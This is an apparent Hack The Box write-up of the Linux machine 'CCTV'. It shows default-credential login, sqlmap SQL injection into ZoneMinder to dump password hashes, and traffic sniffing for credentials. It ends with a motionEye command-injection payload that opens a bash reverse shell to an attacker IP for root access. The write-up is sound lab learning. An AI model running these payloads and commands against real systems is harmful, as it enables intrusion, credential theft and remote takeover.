---
title: "HTB - CCTV"
date: 2026-08-08
draft: false
tags: ["HTB", "Linux", "Write-Up"]
cover:
    image: "/images/writeup_screens/htb_cctv/htb_cctv_cover.png"      
    alt: "HTB CCTV Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Easy |
| Type | Linux |

**Port Scan**
```
└─$ nmap -sV -p- $IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 13:46 +0100
Nmap scan report for 10.129.7.139
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.79 seconds

```

## User Flag

A web server is running on the default **HTTP** port **80** at the target. If we visit it via a browser we get presented with the home page of **SecureVision** where we can find a _Staff Login_ button. This redirects us to a **ZoneMinder** Login page. After a short Google search i found the valid default credentials _admin:admin_ with which i was able to authenticate and access the interface. 

Looking at the **ZoneMinder** interface, a version number caughed my eye: 

![](/images/writeup_screens/htb_cctv/htb_cctv_1.png)

> When dealing with standard software, we should always check for known vulnerabilities affecting the version in use.

After a short online research I found that the version _1.37.63_ is affected by **CVE-2024-51482** for which i found a [public exploit](https://github.com/Gh0s7Ops/CVE-2024-51482-Multi-Stage-Surveillance-System-Exploit). I followed the steps of the exploit and enumerated the database with **sqlmap** as follows:

First, i used the following command to identify the injection point: 
```
sqlmap -u "http://<target_ip>/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<cookie_from_developer_tools>" \
    -p tid --dbms=mysql --batch
```

Then i enumerated the available databases:
```
sqlmap -u "http://<target_ip>/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<cookie_from_developer_tools>" \
    -p tid --dbms=mysql --batch --dbs
```

I found the following databases: 
```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

I enumerated the tables from the _zm_ database which seems to be the most interesting one: 
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<cookie_from_developer_tools>" \
    -p tid --dbms=mysql --batch --tables -D zm
```

I found a lot of tables which i am not going to list here since the most interesting one is the _Users_ table anyway. We can enumerate the columns of the table with the following: 

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<cookie_from_developer_tools>" \
    -p tid --dbms=mysql --batch --columns -D zm -T Users
```

As expected **sqlmap** retrieved the columns _Username_ and _Password_ among others. I tried to dump the usernames first but oddly **sqlmap** only found _blank_ entries. This means i have to get the usernames from a different source. After searching the web-interface i found them in **Options &rarr; Users**:

![](/images/writeup_screens/htb_cctv/htb_cctv_2.png)

We can now go back to our **sqlmap** session and try to retrieve the password hashes for these users with:
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=7lghv2jdmmolc6j59n4qdjh8be" \
    -p tid --dbms=mysql --batch --dump -D zm -T Users -C Password

```

I successfully retrieved the **Bcrypt** Hashes for the three users. I fired up hashcat and started cracking. After some time two passwords were cracked: 
```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
```

I tried to get a **SSH** connection to the machine as one of the three users with one of the two cracked passwords and found the following valid **SSH** credentials:

```
mark:opensesame
```

Oddly enough, i didn't find the _user.txt_ in **mark's** home directory. I found out there is another user **sa_mark** so i figured we had to do some lateral movement to get the user flag. 

I noticed that user **mark** is a member of the interesting non-standard group **dip**:
![](/images/writeup_screens/htb_cctv/htb_cctv_3.png)

Members of this group can often use **tcpdump** on specific network interfaces so i tried to sniff traffic on some interfaces. With `ip a` we can see there are a lot of available interfaces on the machine: 

![](/images/writeup_screens/htb_cctv/htb_cctv_4.png)

Via `tcpdump -i INTERFACE_NAME -A -s 0` i sniffed the traffic on _lo_ and _eth0_ which didn't reveal anything interesting so i tried the third one in the list _br-1b6b4b93c636_. After a few seconds i sniffed a packet which revealed the clear-text credentials of user **sa_mark**:

![](/images/writeup_screens/htb_cctv/htb_cctv_5.png)

With the credentials i was able to login as **sa_mark**. The user.txt file was indeed in the home directory of **sa_mark**.

---

## Root Flag

> We can continue either as user **mark** or **sa_mark**.

To get root privileges i did some basic enumeration and found some interesting local ports with `ss -tlnp`:

![](/images/writeup_screens/htb_cctv/htb_cctv_6.png)

We can see here for example that there seems to be a local **MySQL** server running on standard-port **3306**. Furthermore i explored the other ports and found that there is a webpage running on **8765**:

![](/images/writeup_screens/htb_cctv/htb_cctv_7.png)

I wanted to analyze the page interactively via a browser so i setup a port forwarding:

```
ssh -L 8765:127.0.0.1:8765 mark@IP
```

While this session is running, we can access the internal webpage via the browser on our attacker machine by visiting _http://127.0.0.1:8765_:

![](/images/writeup_screens/htb_cctv/htb_cctv_8.png)

We found an internal login page for a **motionEye** interface. I didn't find proper default credentials and credential-reuse also didn't get me in so i looked at the **motionEye** configuration files. In _/etc/motioneye/motion.conf_ I found the following hardcoded admin credentials:

```
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

These were valid and i was able to authenticate as **admin** which granted me access to the interface:

![](/images/writeup_screens/htb_cctv/htb_cctv_9.png)

After some research I found this promising [public RCE exploit](https://github.com/advisories/GHSA-j945-qm58-4gjx) for **motionEye**. The following steps were needed: 

1. Override **JavaScript** function to bypass client-side input validation. This can be done by entering the following in the console tab of the browser-developer-tools:
    ```
    configUiValid = function() { return true; };
    ```

   ![](/images/writeup_screens/htb_cctv/htb_cctv_10.png)

2. Inject the payload. For this we need to go to **Seetings &rarr; Still Images** and use the following payload as **Image File Name**:
    ```
    $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.205/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
    ```
    The remaining fields shall be configured as in the following screenshot:

    ![](/images/writeup_screens/htb_cctv/htb_cctv_11.png)

    Before we click **Apply** we have to go on with step 3.

3. On our attacker machine we have to start a **netcat** listener on port **4444** with `nc -nlvp 4444`
4. In the interface click **Apply** and wait for a root shell to spawn in your listener:
5. 
   ![](/images/writeup_screens/htb_cctv/htb_cctv_12.png)

We can now read _root.txt_ in the _/root_ directory. 
